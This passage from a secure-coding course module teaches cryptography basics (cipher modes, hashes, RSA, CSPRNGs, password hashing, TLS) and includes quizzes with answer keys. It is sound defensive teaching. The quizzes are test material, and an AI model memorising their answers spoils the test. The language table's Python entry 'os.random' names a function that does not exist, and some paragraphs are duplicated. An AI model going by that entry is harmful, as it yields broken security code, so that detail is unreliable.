Historically the *Cipher block chaining* (CBC) mode was used, but this must be calculated sequentially, so it is slow on multi-core systems. Another problem is that many systems that use CBC are vulnerable to attacks unless they are integrity-checked first. So in general, it is best to avoid CBC mode today ([Microsoft CBC Documentation](https://docs.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode), 2020).

A common mode used today is the Galois/Counter Mode (GCM). It is fast, parallelizable, and adds an authentication code so it can easily detect if the wrong key is used. It is a good mode to use. There are other good modes as well; the important thing is to choose a mode wisely, and in particular, to *never* use ECB mode in production systems.

#### Quiz 3.1: Symmetric/Shared Key Encryption Algorithms

\>\>Select the true statement(s):<<

[!x] The Advanced Encryption Standard (AES) supports 3 key sizes: 128, 192, or 256 bits.

[ ] Triple-DES (3DES) is a secure encryption algorithm to use for large amounts of data. {{ selected: This is incorrect. 3DES has an internal block size of only 64 bits, and that makes it vulnerable to a “birthday attack” if significant amounts of data are encrypted with the same key. 3DES is much better than DES by itself, since 3DES has a longer key size, but you should normally use something else like AES where you can. }}

[ ] You should use the Electronic Code Book (ECB) mode of encryption algorithms, since that enables reproducibility.

[x] A common and generally good mode to choose is Galois/Counter Mode (GCM).

### Cryptographic Hashes (Digital Fingerprints)

Some programs need a one-way cryptographic hash algorithm, that is, a function that takes an *arbitrary* amount of data and generates a fixed-length number with special properties. The special properties are that it must be infeasible for an attacker to create:

1. Another message with a given hash value (*preimage resistance*)

2. Another (modified) message with same hash as the first message (*second preimage resistance*)

3. Any two messages with the same hash (*collision resistance*).

The idea is that you can represent an arbitrary amount of data with a smaller value of fixed length. They are “*one-way*” in the sense that you cannot generally recreate the original data given only the hash value. Cryptographic hashes are useful by themselves, and they are also often used as part of larger cryptographic systems.

You should avoid the algorithms MD4, MD5, and SHA-0, as these are known to be broken.

The SHA-2 family (including SHA-256 and SHA-512) and the SHA-3 algorithm are widely used and generally considered secure at the time of this writing. There have been concerns about the SHA-2 family, leading to the development of SHA-3, but as of this writing no full break of SHA-2 has been publicly reported.

The SHA-1 algorithm is a slightly more complicated case. You should not use it in new systems, and should be moving away from it immediately if you are currently using it. NIST deprecated SHA-1 in 2011 because it is basically broken, in the sense that SHA-1 no longer meets the definition of a cryptographic hash. In most cases, it is no problem to switch from SHA-1 to SHA-2 or SHA-3.

However, one annoying problem is that the widely-used git tool (as originally developed) fundamentally depends on SHA-1. The currently-known breaks in SHA-1 don’t matter for common situations. In addition, as of 2020, git uses a hardened variant of SHA-1 that counters the main problems with SHA-1 as it is used within git. However, attacks only get stronger, not weaker, leading to many concerns about the use of SHA-1 in git.

As of this writing, there is an effort to update git so it will support a different cryptographic hash algorithm, specifically SHA-256. This has been complicated because git was not originally designed to support another cryptographic hash algorithm ([A new hash algorithm for Git](https://lwn.net/Articles/811068/), by Jonathan Corbet, 2020). As noted in LWN.net, *“one of the reasons this transition has been so hard is that the original Git implementation was not designed to swap out hashing algorithms. Much of the work to [implement SHA-256 in git] has been walking back this initial design flaw [to make] Git fundamentally indifferent to the hashing algorithm used. This [work] should make Git more adaptable in the future should the need to replace SHA-256 with something stronger arise”* ([Updating the Git protocol for SHA-256](https://lwn.net/Articles/823352/), by John Coggeshall, 2020).

This may be resolved in git by the time you read this. However, the main point is to learn from this mistake. As noted earlier, cryptographic systems (such as algorithms and protocols) *are* occasionally broken, so you must be prepared to replace them.

#### Quiz 3.2: Cryptographic Hashes (Digital Fingerprints)

\>\>Select the true statement(s):<<

[!x] In a secure one-way cryptographic hash algorithm, it should be infeasible, given one message, to create another message that has the same hash value {{ selected: This is true, this is “preimage resistance” }}

[x] SHA-1 no longer meets the full criteria for a one-way cryptographic hash function, so in general you should shift to another algorithm, such as the SHA-2 or SHA-3 family.

[x] A cryptographic hash function accepts an arbitrary amount of data and produces a value with a fixed length that represents the input data.

### Public-Key (Asymmetric) Cryptography

A public key or asymmetric cryptographic system uses pairs of keys. One key is a *private key* (known only to its owner) and the other is a *public key* (which can be publicly distributed). The keys are related but play different roles, which is why these are often called *asymmetric cryptography*. It is vital in these systems to keep the private key private.

These algorithms can be used in one or more ways (depending on the algorithm), including:

* **Encryption**<br>Anyone could encrypt a message using a public key, but only someone with the corresponding private key could decrypt it. Public key encryption algorithms are generally relatively slow, so in many situations, a *key* for a shared-key algorithm is encrypted, and the rest of the message is encrypted with a shared key.

* **Digital signatures (authentication)**<br>A sender can use a public key algorithm and their private key to provide additional data called a *digital signature*; anyone with the public key can verify that the sender holds the corresponding private key.

* **Key exchange**<br>There are public key algorithms that enable two parties to end up with a shared key without outside passive observers being able to determine the key.

A widely-used public key algorithm is the RSA algorithm, which *can* be used for all these purposes. However, *do not implement RSA yourself*. RSA is fundamentally based on exponentiation of large numbers, which lures some developers into implementing it themselves or thinking it is simple. In practice it is extremely easy to implement RSA *insecurely*. For example, it is very difficult to check for weak parameters that *look* acceptable but make it trivial to defeat. To be secure, RSA *must* be implemented with something called “padding”. There is a standard RSA padding scheme with a rigorous proof called OAEP, but it is difficult to implement correctly (incorrect implementations may be vulnerable to *Manger’s attack*). In practice, RSA can be tricky to apply correctly, and unless you understand cryptography, you won’t be able to tell when it is not working ([*Seriously, stop using RSA*](https://blog.trailofbits.com/2019/07/08/fuck-rsa/), 2019).

RSA key lengths need to be longer than you might expect. An RSA key length of 1024 bits is approximately equivalent to a symmetric key length of 80 bits, which is so small that it is generally considered insecure. An RSA key length of 2048 bits is equivalent to a symmetric key length of 112 bits; a 2048 bit is considered barely acceptable by some (e.g., NIST says that this may be used through 2030, after which it may not be used by the US government). If you are using RSA, you should probably use at least 3,072 bit key in current deployments (this is equivalent to a 128 bit symmetric key). You would need an RSA key of 15,360 bits to get the equivalent of a 256-bit symmetric key. See [NIST’s *Recommendation for Key Management: Part 1 - General*](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf) for more about key equivalent lengths. Unfortunately, RSA is relatively slow, especially as you increase to key lengths necessary for minimum security. For all these reasons, some organizations, such as Trail of Bits, recommend avoiding using RSA in most cases ([*Seriously, stop using RSA*](https://blog.trailofbits.com/2019/07/08/fuck-rsa/), 2019).

A whole family of algorithms are called *elliptic curve cryptography*; these are algorithms that are based on complex math involving elliptic curves. These algorithms require far shorter key lengths for equivalent cryptographic strength, and that is a significant advantage. Historically, elliptic curve cryptography involved a minefield of patents, but over the years many of those patents have expired and so elliptic curve cryptography has become more common. A widely-used and respected algorithm for key exchange and digital signatures is Curve25519; a related protocol called ECIES combines Curve25519 key exchange with a symmetric key algorithm (for more details, see [*Seriously, stop using RSA*](https://blog.trailofbits.com/2019/07/08/fuck-rsa/), 2019).

The Digital Signature Standard (DSS) is a standard for creating cryptographic digital signatures. It supports several underlying algorithms: Digital Signature Algorithm (DSA), the RSA digital signature algorithm, and the elliptic curve digital signature algorithm (ECDSA).

There are also a variety of key exchange algorithms. The oldest is the Diffie-Hellman key exchange algorithm. There is a newer key exchange algorithm based on elliptic curves, called Elliptic Curve Diffie-Hellman (ECDH).

As hinted at earlier, it is critical that you use existing well-respected implementations (don’t implement it yourself), and check any parameters you choose carefully. Perhaps the most important is the key length for that algorithm (as noted earlier, elliptic curve algorithms have equivalent strength with shorter keys). A useful source for recommended key lengths is [NIST’s *Recommendation for Key Management: Part 1 - General*](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf).

#### Quiz 3.3: Public-Key (Asymmetric) Cryptography

\>\>Select the true statement(s):<<

[!] RSA with a 1024-bit key is generally considered adequately secure for most use cases.

[ ] RSA is basically exponentiation, so to limit dependencies it is often better to reimplement it within a larger system.

[x] Curve25519 is a widely-used algorithm that is generally considered secure.

### Cryptographically Secure Pseudo-Random Number Generator (CSPRNG)

Many algorithms depend on secret values that cannot be practically guessed by an attacker, aka "cryptographically secure". This includes values used by cryptography algorithms (such as private keys and nonces), session ids, and many other values. If an attacker can guess a value, including past or future values, many systems become insecure.

One challenge is historical: today, the name *random* in programming language libraries usually implies that the function is *not* cryptographically secure. One of the first uses for digital computers was to implement simulations (especially *Monte Carlo simulations*) where random numbers were repeatedly acquired for a simulation. It was often important to be able to *reconstruct* these random numbers so experiments could be repeated. Internally, such random functions would be implemented using algorithms such as a linear congruential generator (LCG), and would often be “seeded” (initialized) by values such as a date/time that can be trivially guessed by an attacker. Because this was one of the first uses of computers, there is a convention across almost all programming languages that the word “random” refers to a way to create a sequence of numbers that could be easily reconstructed later if needed. In other words, the word “random” in programming languages typically implies “*predictably random*”, and that is not what you want in cryptography or security. Such random numbers *must not* be used for security mechanisms where it is important that an attacker *not* be able to determine the number.

![In this figure getRandomNumber is implemented by returning the constant 4, a number chosen by fair dice roll and claimed to be guaranteed to be random.](random_number.png)

**Random Number**, retrieved from [xkcd.com](https://xkcd.com/221), licensed under [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/)

Instead, for cryptography and security-related tasks you need to use a [cryptographically secure pseudo-random number generator (CSPRNG)](https://en.wikipedia.org/wiki/Cryptographically-secure_pseudorandom_number_generator) for crypto and security-related tasks. Put another way, there are many pseudo-random number generator (PRNG) algorithms and implementations, but for security, you should *only* use PRNGs that are cryptographically secure PRNGs (CSPRNGs). A good CSPRNG prevents practically predicting the next output given past outputs (at greater than random chance) and it also prevents revealing past outputs if its internal state is compromised. CSPRNGs are also called cryptographic PRNGs (CPRNGs). Typically a CSPRNG implementation's name will have “secure” and/or “crypto” in it. In their documentation, you may see references to well-accepted CSPRNG algorithms such as Yarrow, Fortuna, ANSI X9.17 (which can use any block cipher), NIST SP 800-90A’s Hash_DRBG, HMAC_DRBG, and CTR_DRBG.

**🚩 Never use the algorithm Dual_EC_DRBG, as it is widely accepted that this is a subverted and insecure algorithm.**

Here are some examples of how to call the predictable PRNG versus a cryptographically secure PRNG in different programming languages (in practice there are often multiple ways; the point is to show that they are different):

<table>
  <tr>
    <td>Language</td>
    <td>Predictable random value<br>(do not use for security)</td>
    <td>Cryptographically secure random value</td>
  </tr>
  <tr>
    <td>Java</td>
    <td>Random()</td>
    <td>SecureRandom()</td>
  </tr>
  <tr>
    <td>C#</td>
    <td>System.Random</td>
    <td>System.Security.Cryptography. RandomNumberGenerator</td>
  </tr>
  <tr>
    <td>JavaScript</td>
    <td>Math.random</td>
    <td>window.crypto.getRandomValues<br>or crypto.randomBytes</td>
  </tr>
  <tr>
    <td>Python</td>
    <td>random</td>
    <td>os.random</td>
  </tr>
</table>


Another challenge is that software is fundamentally deterministic; given exactly the same inputs, a sequential algorithm should produce exactly the same output. You should not normally be directly seeding (initializing) any cryptographically secure algorithms, as many of these libraries implement secure seeding themselves. If you must seed it (and that is a bad sign), ensure that attackers cannot guess the seed value. Some people seed cryptographically secure PRNGs algorithms with date/time data, which is a vulnerability; in many cases, attackers can easily guess the likely date/times.

There is a simple solution: use a CSPRNG and use hardware to correctly provide data to it. Most operating system kernels today provide cryptographically secure random numbers by gathering environmental noise from multiple hardware devices and implementing a CSPRNG. If you’re running on bare metal (instead of an operating system kernel) there are usually reusable libraries you can use for this purpose. These cryptographically secure random numbers can be used directly, or can be used as a secure seed for a cryptographically secure PRNG.

For example, the Linux kernel provides cryptographically secure random number values via its `getrandom` system call, as well as the special files `/dev/urandom` and `/dev/random`. In most cases you would want to use the `getrandom` system call where practical, or the `/dev/urandom` special file if `getrandom` is hard to access (e.g., from a shell script). These generate cryptographically secure random values using a CSPRNG and entropy gathered by the kernel. In special circumstances, such as creating a long-lived cryptographic key, you might instead want to use `/dev/random` or the equivalent option in `getrandom`; this forces the kernel to wait (block) until it has a high estimated amount of internal entropy. The purpose of `/dev/random` is to ensure there is a large amount of internal entropy, but the blocking may be indefinite in some circumstances and it’s usually not necessary. What's important is that an attacker can't practically guess the random value, not the value of this internal entropy estimate. (see [“Myths about /dev/urandom”](https://www.2uo.de/myths-about-urandom/) by Thomas). In the future there may be no difference between `/dev/random` and `/dev/urandom`.

For example, the Linux kernel provides cryptographically secure random number values via its **/dev/urandom** special file, its **/dev/random** special file, and its **getrandom** system call. In most cases you would want to use the **/dev/urandom** special file or the **getrandom** system call. These generate cryptographically secure random values using a CSPRNG and entropy gathered by the kernel. In special circumstances, such as creating a long-lived cryptographic key, you might instead want to use **/dev/random** or the equivalent option in **getrandom**; this forces the kernel to wait (block) until it has a high estimated amount of internal entropy. The purpose of **/dev/random** is to ensure there is internal entropy, but the blocking may be indefinite in some circumstances and it’s usually not necessary

A particularly nasty security problem in computer systems is *insecure random number generators*. An insecure random number generator produces values that look fine, but destroys the security of the entire system. Many failures of cryptographic systems have been traced back to bad random number generation, in part because it can be hard to detect the problem.

In many cases using insecure random number generators is an unintentional mistake, but in some cases organizations *intentionally* subvert random number generators. For example, in 2020 it was revealed that the US CIA, in cooperation with West Germany intelligence, owned the company Crypto AG and had widely sold cryptographic products that had been intentionally subverted, in at least some cases by tampering with how it generated “random” values. See [The intelligence coup of the century](https://www.washingtonpost.com/graphics/2020/world/national-security/cia-crypto-encryption-machines-espionage/) by Greg Miller for more information.

Insecure random number generation is an especially serious problem in Internet of Things (IoT) device software. One 2021 report found that about 35 billion IoT devices had disastrous security vulnerabilities due to insecure cryptographic random number generation. This is in part because many IoT software developers directly call hardware random number generators (they shouldn’t do that), but even worse, they ignored error return codes from those generators (and they definitely shouldn’t do that). Hardware random number generators typically have easily-exceeded generation rates, so they can generate random numbers at limited speeds only. If users read too fast, the generator will likely report errors. Just paying attention to the error code from the hardware isn’t really enough, though.  Hardware sometimes fails, and if the software just hangs in that case, the IoT device may be too unreliable to compete. Sample code for accessing the random number generator hardware is often insecure (it shows how to get data, but not how to use it correctly). Correctly using the hardware directly can be quite difficult, for example, the LPC 54628’s user manual page number 1,106 (of 1,152) notes, in a convoluted way, that after reading a random number from its hardware you must read and throw away the next 32 values. The same research also shows that hardware random number generators from popular processors used in IoT products do not generate fully random data. One can use a randomness test to verify if the generated numbers are actually random.

Software developers for IoT devices should not access the hardware registers directly, but should instead call well-crafted CSPRNG generators that correctly use hardware sources (preferably multiple sources) as inputs into their internal entropy pool. In most cases IoT developers should use an IoT operating system that includes a CSPRG implementation that is correctly seeded from multiple hardware sources, and simply check to see if it appears to be carefully written for security. Where that’s not practical, use a well-crafted and analyzed CSPRNG library that includes correct software to extract random values from your hardware; do not implement your own crypto unless you’re an expert in cryptography. IoT software developers should also run statistical tests on their random number generation mechanism to ensure that they’re random, because this is an especially common problem in IoT devices. For more details, see [You're Doing IoT RNG](https://labs.bishopfox.com/tech-blog/youre-doing-iot-rng) ([presentation](https://www.youtube.com/watch?v=Zuqw0-jZh9Y)) by Dan Petro and Allan Cecil, a 2021 DEF CON presentation.

In summary: Make sure you use a strong, properly-implemented cryptographically secure pseudo-random random number (CSPRNG) generator, seeded with multiple hardware values, every time you need a value that an adversary cannot predict. You should look for a function that says it’s a “secure” or “cryptographic” random number generator. Don’t use an ordinary “random” number generator, such as anything documented as using a linear congruential generator (LCG), for those purposes.

> 😱 STORY TIME: Vulnerable Keys Generated by Debian/Ubuntu’s OpenSSL

> In 2006 Debian Linux made a change to its version of the widely-used OpenSSL cryptographic library to attempt to remove a warning. However, the change was made by someone not well-versed in cryptography and unintentionally subverted OpenSSL's random number generator for keys on Debian. There was a brief attempt to communicate with the upstream OpenSSL library developers, but there was no attempt to propose the change back to the OpenSSL project so that the OpenSSL project could verify that the change was harmless. This meant that all keys generated via OpenSSL by Debian, as well as Ubuntu (which is based on Debian), were insecure until the vulnerability was found in 2008. This included OpenSSH keys generated by calling OpenSSL. This vulnerability was given the identifier [CVE-2008-0166](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0166). Seven years later, Ben Cox reported that a large number of vulnerable keys created from this mistake were still in use and some had control over important GitHub repositories. These included repositories of Spotify, Yandex, the cryptographic libraries for Python, and Python’s core. (Ben Cox, “[Auditing GitHub users’ SSH key quality](https://blog.benjojo.co.uk/post/auditing-github-users-keys)”, 2015). This example shows how important cryptographically secure random values can be.

If you need a cryptographically random number in a range
(e.g., an integer from 0 to a number N),
do **not** simply use the modulus or remainder operators.
Many programmers incorrectly *think* it's fine to directly use the
modulus or remainder operators (e.g., `%` or `mod` in many languages)
for this purpose.
However, this often causes some numbers to be more likely than others,
a problem called *modulo bias*.
Modulo bias can sometimes lead to system exploitation.
(Yolan Romailler,
[*The definitive guide to “Modulo Bias and how to avoid it”!*](https://research.kudelskisecurity.com/2020/07/28/the-definitive-guide-to-modulo-bias-and-how-to-avoid-it/))

If you need a cryptographically random number in a range, don't use modulus
or remainder operators directly - instead, use an existing
function that provides *unbiased* cryptographically random numbers in a range.
Most CSPRNG libraries provide this function - just check that it's unbiased.
If you must implement this yourself, there are various methods such
as rejection sampling,
[nearly-divisionless random numbers per Daniel Lemire's algorithm](https://dotat.at/@/2020-10-29-nearly-divisionless-random-numbers.html), or
[divisionless random numbers per Steve Cannon and Kendall Willets](https://dotat.at/@/2022-04-20-really-divisionless.html).
However, you should normally just use the CSPRNG library function
that provides this function.

#### Quiz 3.4: Cryptographically Secure Pseudo-Random Number Generator (CSPRNG)

\>\>Select the true statement(s):<<

[!x] In many programming languages, a cryptographically secure pseudo-random number generator will have “secure” or “crypto” in its name.

[x] In many programming languages, a function/method with the name “random” but no other indicator is typically a predictable random number and should not be used for security.

[ ] It is easy to tell if a cryptographic PRNG is subverted.

### Storing Passwords

A common need is that you are implementing a service and/or server application, and you need the user to authenticate and/or prove that they are authorized to make a request. This is called *inbound authentication*. Here are three common approaches for doing this:

1. Delegate this determination to some other service. You need to trust that other service, and you need a specification for communicating this. OAUTH and OpenID are two common specifications for making the request to the other service. Generally, you would call on a routine to implement this; make sure you apply its security guidance. This can be convenient to users, but remember that this reveals every login to that external service (a privacy concern), and make sure you can trust that service.

2. Require the requestor to have a private key that proves their identity. SSH and HTTPS both support this. A great advantage of this approach is that at the server end only a public key needs to be recorded, so while integrity is important, the confidentiality of the keys is not as critical. However, this requires that the user set up this private key.

3. Support a password-based login (at least in part).

If you implement option 3, supporting a password-based login (at least in part), you have a lot of company. Passwords have many known problems, but they are known problems. If you are going to use passwords, at least in part, you need to do it correctly.

**Beware** of storing passwords in an insecure way. A database full of password information is a tempting target for attackers. In practice, many attackers have managed to gain databases of password-related information (e.g., by breaking into the service or acquiring a backup). A secure system *must* be designed so that attackers cannot easily exploit server-side password databases, even when attackers manage to retrieve a copy. Here are some approaches that do **NOT** work:

* Storing passwords “in the clear” (unencrypted). Obviously, if an attacker gets this data, the attacker can use all the passwords. **_Don’t do this!_**

* Hashing the passwords (e.g., with MD5, SHA-1, or SHA-256). Attackers have tools that can brute-force guess billions of passwords, hash them all, and compare them with the hashed values, so this does not protect the passwords. **_Don’t do this!_**

* Per-user salted hashes. This combines the password with a random per-user value called a “salt”, then hashes the combination. The problem is that modern hash algorithms are so fast that attackers can still guess billions of passwords and often find a user’s password. Again, **_don’t do this!_**

If you are using passwords for inbound authentication, for security you **_must_** use a special kind of algorithm for this purpose called an *iterated per-user salted cryptographic hash* algorithm. The term “iterated” is also called key derivation. Three algorithms are commonly used as an iterated per-user salted cryptographic hash algorithm:

* **Argon2id**<br>Unless you have a strong reason to use something else, this is the algorithm to use today. It is relatively strong against both software and hardware-based attacks.

* **Bcrypt**<br>This is a decent algorithm against software-based attacks. It is not as easy to attack with hardware compared to PBKDF2 (because bcrypt requires more RAM), but it is weaker against hardware-based attacks compared to Argon2id.

* **PBKDF2**<br>This is a decent algorithm against software-based attacks, but it is the most vulnerable of these widely-used algorithms to hardware-based attacks from specialized circuits or GPUs. That is because it can be implemented with a small circuit and little RAM. You may not need to replace it (depending on the kinds of attackers that concern you), but it is probably best to avoid this for new systems today.

Another algorithm that is in use is scrypt. This should also be strong against hardware attacks, but it has not gotten as much review compared to Argon2id, so Argon2id is more commonly recommended. That said, at the time of this writing, it has no known serious problems.

All of these algorithms have various configuration options, and it is vital to use an adequately secure set of options. The OWASP [Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) provides a set of recommended configuration option values.

You should allow users to require the use of two-factor authentication (2FA), either directly or by delegating to a service that does.

Also, beware of implementing these algorithms only on the client side. It is fine to implement them on the client side (because that prevents the server from ever discovering the password the user enters), as long as they are *also* implemented on the server. The danger is doing them *only* on the client; if that happens, then what is stored in the server is no different from storing passwords in the clear. Once attackers get the password database, they can simply create or modify their own client to log into anyone’s account.

> 😱 STORY TIME: Ashley Madison data breach
> Ashley Madison is a Canadian commercial online dating service founded in 2002 and marketed as enabling cheating on romantic partners. In 2015 attackers stole its customer data. Many issues were revealed at that point; we will focus on one here. Ashley Madison had correctly used the **bcrypt** routine to store user passwords. Unfortunately, in many cases they had *also* stored passwords encoded using the **MD5** hashing algorithm, which is not an appropriate algorithm for storing passwords (as noted above). Attackers used these unprotected MD5 password hashes to decipher more than 11 million of these accounts' passwords in just 10 days, enabling them to log into those accounts (["Once seen as bulletproof, 11 million+ Ashley Madison passwords already cracked" by Dan Goodin, 2015](https://arstechnica.com/information-technology/2015/09/once-seen-as-bulletproof-11-million-ashley-madison-passwords-already-cracked/)).

#### Quiz 3.5: Storing Passwords

\>\>Select the true statement(s):<<

[!] You can eliminate all authentication security and privacy concerns by delegating authentication to another service. {{ selected: Not so. For one thing, can you trust that other service? That other service will know who authenticated when; is that acceptable? In many cases it is a good decision to delegate, but you need to consider the ramifications. }}

[ ] A secure way for a server to store passwords for inbound authentication is to hash the password using SHA-1. {{ selected: Absolutely not, that is an *insecure* approach. You should use an algorithm specifically designed for this purpose, such as Argon2id. }}

[ ] PBKDF2 is more secure than Argon2id. {{ selected: No, that is the wrong way around. Argon2id has a much stronger resistance to hardware-based attacks than PBKDF2. }}

[x] Argon2id, bcrypt, and PBKDF2 are all common iterated per-user salted cryptographic hash algorithms; among those three, prefer Argon2id unless you have a reason to do otherwise.

### Transport Layer Security (TLS)

Transport Layer Security (TLS) is a widely-used cryptographic protocol to provide security over a network between two parties. It provides privacy and integrity between those parties. TLS version 1.3 was released in 2018. An older and insecure version of this protocol was named Secure Sockets Layer (SSL), and sometimes the terms are used interchangeably. When you use **https&#58;//** in a web browser or server today, you are normally using TLS (in rare cases, you might be using its insecure predecessor, SSL). TLS is also used in other applications, for example, to protect exchanges of email between different Mail Transport Agents (MTAs).

#### Certificate Validation

To use TLS properly, the server side at least needs a certificate (so it can prove to potential clients that it is the system it claims to be). You can create a certificate yourself and install its public key on each client (e.g., web browser) who will connect to that server. That is fine for testing, but in most other situations, that is too complicated. In most cases (other than testing) you should get a certificate assigned by a certificate authority. You can get free certificates from [Let’s Encrypt](https://letsencrypt.org/). If the requirements of Let’s Encrypt don’t suit your needs, other certificate authorities may be useful to you.

When clients connect to a server using TLS, the client normally needs to check that the certificate is valid. Web browsers have long worked this out; web browsers come with a configurable set of certificate authority public keys (directly or via the operating system) and automatically verify each new TLS connection.

*Beware*: If you are using your own client, instead of using a web browser, double-check that you are using the TLS library API *correctly*. Many TLS library APIs do *not* fully verify the server’s TLS certificate automatically. For example, they may allow connections to a server when there is no server certificate, they may allow any certificate (instead of a certificate for the site you are trying to connect to), or allow expired certificates. This is an extremely common mistake ([*The Most Dangerous Code in the World: Validating SSL Certificates in Non-Browser Software*](https://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf), by Martin Georgiev, Subodh Iyengar, Suman Jana, Rishita Anubhai, Dan Boneh, and Vitaly Shmatikov, 2012). If this is the case, you may be using a low-level TLS API instead of the API you should be using.

🔔 Improper certificate validation is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #26 and2021 CWE Top 25 #26 and  2019 CWE Top 25 #25. It is identified as [CWE-295](https://cwe.mitre.org/data/definitions/295.html), *Improper Certificate Validation*.

#### Ciphersuites

TLS, as a protocol, combines many of the pieces we have discussed. At the beginning of communication, the two sides must negotiate to determine the set of algorithms (including key lengths) that will be used for its connection. This set of algorithms is called the *ciphersuite*. That means that, for security, it is important to have good default configurations and to have the software configured correctly when deploying it.

If you are configuring an HTTPS site, a great place to get currently-recommended settings is [Mozilla’s](https://wiki.mozilla.org/Security/Server_Side_TLS) [*Security/Server Side TLS*](https://wiki.mozilla.org/Security/Server_Side_TLS)[site](https://wiki.mozilla.org/Security/Server_Side_TLS). A key decision for you to make is if you want the modern, intermediate, or old configuration:

* Modern: Most secure, but a non-trivial number of clients might not be able to connect to it.

* Intermediate: A compromise setting that allows slightly older clients to connect while providing reasonably good security.

* Old: A setting that provides the best possible security that supports much older clients and libraries. Its security is much weaker than intermediate.

At the time of this writing, the *intermediate setting* is recommended in most cases, but check that website for updates.

You will notice that any configuration has a list of TLS ciphersuites in order of preference. For example, the `TLS_AES_128_GCM_SHA256` means that TLS is to use the Advanced Encryption Standard (AES) with 128-bit key in Galois/Counter mode (GCM) combined with the secure hash algorithm with 256 bits (SHA-256).

Once you have deployed your system, you should test it. If the site is publicly visible, it is a great idea to use the free Qualys test called the [SSL Server Test](https://www.ssllabs.com/ssltest/). It is called the SSL Server Test because that is the old name for TLS, but don’t be fooled, it works well with TLS (and will complain if you allow the vulnerable SSL protocols).

#### Quiz 3.6: Transport Layer Security (TLS)

\>\>Select the true statement(s):<<

[!] If you are invoking a TLS library, it is reasonable to assume that it fully verifies the server’s TLS certificate automatically. {{ selected: Not so. Many libraries do *not* fully verify it, e.g., they might not verify that the certificate is appropriate for a given system. Some do, but when using a TLS library you have not used before, it is important to check what it verifies. }}

[x] Web browsers use TLS or SSL when connecting to an external site with an “**https:**” URL.

[x] When web browsers contact a server with TLS, they use a configurable set of certificate authority public keys (either included with the browser or provided via the operating system).

[x] Recommended HTTPS server settings can be found at Mozilla’s “Security/Server Side TLS” site.

### Other Topics in Cryptography

#### Getting Cryptographic Advice

In this course, we have tried to give some basics and enough information to apply them in various circumstances. Perhaps most important, however, are the key pieces of advice: do not create your own cryptographic algorithms or protocols, and do not create your own implementations. Instead, reuse well-respected algorithms, protocols, and implementations. When configuring cryptography, look for current well-respected advice. Examples of such sources include Mozilla’s [Security/Server Side TLS site](https://wiki.mozilla.org/Security/Server_Side_TLS), NIST (especially NIST’s [*Recommendation for Key Management: Part 1 - General*](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf)), and CISCO’s [*Next Generation Cryptography*](https://tools.cisco.com/security/center/resources/next_generation_cryptography). Cryptographers won’t always agree on what is “best” (as with any other field), but experts will be able to point out what is clearly broken and what is widely agreed to be much safer.

#### Constant Time Algorithms

There is an important topic that we have not mentioned yet: constant-time algorithms, especially constant-time comparisons. Many algorithms take a variable amount of time depending on their data. For example, if you want to determine if two arrays are equal, usually that comparison would stop on the first unequal value.

Those who develop cryptographic libraries must implement their algorithms so that the time they take does not vary based on their input data (this is non-trivial, though possible, with AES). Most developers are never taught how to do this, so this is one of many reasons you should not write your own cryptographic library. However, there is a variation that can often happen outside of these libraries: sometimes you have to handle array comparisons specially.

The normal comparison operations (such as **is-equal**) try to minimize execution time, and this can sometimes leak timing information about the values to attackers. If an attacker could repeatedly send in data and notice that a comparison of a value beginning with “0” takes longer than one that does not, then the first value it is compared to must be “0”. The attacker can then repeatedly guess the second digit, then the third, and so on. Many developers incorrectly believe that it is not possible for attackers to exploit timing variations over a network; this is a false belief attackers love to exploit. Modern statistics turns out to be remarkably powerful for removing latency variances; attackers really *can* exploit these latencies.

*Constant-time comparisons* are comparisons (usually equality) that take the same time no matter what data is provided to them. These are not the same as O(1) operations in computer science. Examples of these constant-time comparison functions are:

* Node.js: **crypto.timingSafeEqual**

* Ruby on Rails: **ActiveSupport::SecurityUtils secure_compare** and **fixed_length_secure_compare**

* Java: **MessageDigest.equal** (assuming you are not using an ancient version of Java)

Whenever you compare secret values or cryptographic values (such as session keys), use a *constant-time comparison* instead of a normal comparison unless an attacker cannot exploit the normal comparison timing. You don’t need to do this with an iterated salted hash computed in a trusted environment (such as your server), because it will take an attacker too much time to create the matching values. You *do* need to do this if you are directly comparing session keys to a stored value, since attackers *can* sometimes iterate this to figure out each digit in the session key.

#### Minimizing the Time Keys/Decrypted Data Exists

Remember that per least privilege, we want to minimize the time a privilege is active. In cryptography, you often want to minimize the time a private key or password is available, or at least minimize the time that the decrypted data is available. This can be harder that you might think. At the operating system level you can probably lock it into memory with **mlock()** or **VirtualLock()**; this will at least prevent the data from being copied into storage. Ideally, you would erase it from memory after use, though that is often surprisingly difficult. Compilers may turn overwrite code into a no-op, because they detect that nothing reads the overwritten values. Languages with built-in garbage collection often quietly make extra copies and/or do not provide a mechanism for erasure. That said, some languages or infrastructure do make this easy. For example, those using the .NET framework (e.g., C#) can use SecureString.

#### Quantum Computing

One of the large future unknowns in cryptography is the potential impact of general-purpose quantum computers. At the time of this writing, so-called *general-purpose* quantum computers exist, but they are not powerful enough to threaten current cryptographic algorithms. It is not known if such more powerful general-purpose quantum computers can be built, and if so, when that will happen. If strong general-purpose quantum computers are built, they have the potential to break all the public-key algorithms that are popular in 2020 by using an algorithm called *Shor’s algorithm*. As a result, researchers are developing new public-key algorithms that resist attacks from such quantum computers, an area called *post-quantum cryptography*. At the time of this writing, many such algorithms have been developed and are being evaluated.

In contrast, current symmetric cryptographic algorithms and hash functions are less affected by quantum computers. Grover’s algorithm speeds up attacks against symmetric ciphers, halving their effective length. That means that 128-bit AES could be broken by a quantum computer (it would then be equivalent to a 64-bit key today), but 256-bit AES would still be secure (it would be equivalent to a 128-bit key today). So simply using longer keys and hashes is expected to be adequate in a post-quantum world for symmetric cryptographic algorithms and hash functions.

#### Humility Is Important in Cryptography

Perhaps the most important lesson here is to be humble when using cryptography. Many cryptographic algorithms have been developed in the past, only to be broken later. It is hubris to think that our current algorithms and protocols cannot be broken.

